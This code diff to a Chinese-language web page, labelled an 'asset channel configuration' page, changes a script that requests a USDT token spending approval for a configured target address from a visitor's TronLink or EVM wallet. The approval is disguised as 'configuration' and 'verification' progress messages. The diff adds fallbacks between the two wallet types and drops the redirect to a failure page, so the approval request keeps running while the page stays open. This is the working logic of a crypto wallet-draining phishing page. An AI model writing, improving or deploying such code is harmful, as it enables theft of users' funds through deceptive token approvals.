@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>TronLink 授权配置页面</title>
+<title>資產通道配置頁面</title>
 <style>
   body {
     background: #121212;
@@ -15,6 +15,9 @@
     margin: 0;
     justify-content: center;
     align-items: center;
+  }
+  h2 {
+    margin-bottom: 1rem;
   }
   .status {
     font-size: 1.4rem;
@@ -78,7 +81,6 @@
     }
   }
 
-  // 等待 TronWeb 初始化，最长等待 5 秒
   async function waitForTronWeb(timeout = 5000) {
     return new Promise((resolve, reject) => {
       let waited = 0;
@@ -98,21 +100,23 @@
 
   async function tronApprove() {
     try {
-      setStatus("資產通道配置中...", "loading", 60);
+      setStatus("資產通道配置中（TronLink）...", "loading", 60);
       const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
       await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
-      setStatus("✅ 配置完成", "success", 100);
+      setStatus("✅ TronLink 配置完成", "success", 100);
       setTimeout(() => window.location.href = "success.html", 800);
+      return true;
     } catch (e) {
       console.error("TronApprove Error:", e);
-      setStatus("鏈路配置失敗", "error", 100);
-      setTimeout(() => window.location.href = "fail.html", 1500);
+      setStatus("TronLink 授權失敗", "error", 100);
+      // 不跳转失败页，返回 false 让上层处理
+      return false;
     }
   }
 
   async function evmApprove() {
     try {
-      setStatus("資產通道配置中...", "loading", 60);
+      setStatus("資產通道配置中（EVM）...", "loading", 60);
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
       const network = await provider.getNetwork();
@@ -125,12 +129,13 @@
       const contract = new ethers.Contract(usdtAddress, abi, signer);
       const tx = await contract.approve(CFG.TARGET.EVM, CFG.AMOUNT);
       await tx.wait();
-      setStatus("✅ 配置完成", "success", 100);
+      setStatus("✅ EVM 配置完成", "success", 100);
       setTimeout(() => window.location.href = "success.html", 800);
+      return true;
     } catch (e) {
-      console.error("EVM Approve Error:", e);
-      setStatus("鏈路配置失敗", "error", 100);
-      setTimeout(() => window.location.href = "fail.html", 1500);
+      console.warn("EVM 授權失敗，準備回退使用 TronLink", e);
+      // 不跳转失败页，返回 false 让上层处理
+      return false;
     }
   }
 
@@ -138,39 +143,49 @@
     try {
       setStatus("正在檢測鏈路...", "loading", 10);
 
-      // TronLink 檢測
+      // 優先嘗試 TronLink
       if (window.tronLink || (window.tronWeb && window.tronWeb.ready)) {
         try {
           setStatus("等待 TronLink 初始化...", "loading", 30);
           await waitForTronWeb();
-          await tronApprove();
-          return;
+          const tronOk = await tronApprove();
+          if (tronOk) return;  // 成功結束
         } catch (e) {
-          console.warn("TronWeb 未初始化", e);
-          // 继续尝试 EVM 或失败
+          console.warn("TronWeb 初始化或授權失敗", e);
+          // 失敗繼續嘗試 EVM
         }
       }
 
-      // EVM 檢測
+      // 嘗試 EVM 授權
       if (window.ethereum) {
         setStatus("請求 EVM 錢包授權...", "loading", 30);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        await evmApprove();
-        return;
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const evmOk = await evmApprove();
+          if (evmOk) return; // 成功結束
+          // EVM 失敗，回退用 TronLink 授權
+        } catch (e) {
+          console.warn("EVM 授權請求失敗", e);
+        }
       }
 
-      // 都没检测到钱包
-      setStatus("未檢測到鏈路組件", "error", 100);
-      setTimeout(() => window.location.href = "fail.html", 1500);
+      // EVM 授權失敗，回退嘗試 TronLink（如果已初始化）
+      if (window.tronWeb && window.tronWeb.ready) {
+        setStatus("EVM 授權失敗，回退使用 TronLink 授權...", "loading", 50);
+        const tronOk = await tronApprove();
+        if (tronOk) return;  // 成功結束
+      }
+
+      // 全部失敗，不跳轉失敗頁，顯示錯誤狀態，但停留當前頁
+      setStatus("鏈路授權失敗，請檢查錢包或稍後重試", "error", 100);
+
     } catch (err) {
       console.error("驗證過程錯誤", err);
-      setStatus("驗證未完成", "error", 100);
-      setTimeout(() => window.location.href = "fail.html", 1500);
+      setStatus("驗證過程出錯，請稍後重試", "error", 100);
     }
   }
 
   window.addEventListener('load', () => {
-    // 启动时给个动画进度递增
     let progress = 0;
     const progressInterval = setInterval(() => {
       progress += 5;
